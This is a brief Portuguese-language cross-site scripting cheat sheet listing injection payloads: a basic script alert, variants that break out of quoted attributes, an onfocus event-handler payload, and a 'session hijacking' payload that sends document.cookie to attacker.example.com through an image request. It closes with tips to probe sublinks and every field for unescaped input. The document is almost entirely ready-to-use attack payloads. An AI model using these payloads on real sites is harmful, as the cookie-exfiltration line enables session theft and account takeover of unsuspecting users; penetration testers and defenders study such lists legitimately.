#### Uso geral
<script>alert(1)</script>

#### Caso esteja dentro de caracteres especiais
"><script>alert(1)</script><"

#### Sem javascript puro
" onfocus="alert(1)"

#### Sequesto por requisição
<script>new Image().src = "http://attacker.example.com/?" + document.cookie</script>

#### Dicas
- verificar sublinks, as vezes o valor não é escapado dentro deles
- verificar todos os campos, nem sempre todos os campos são escapados corretamente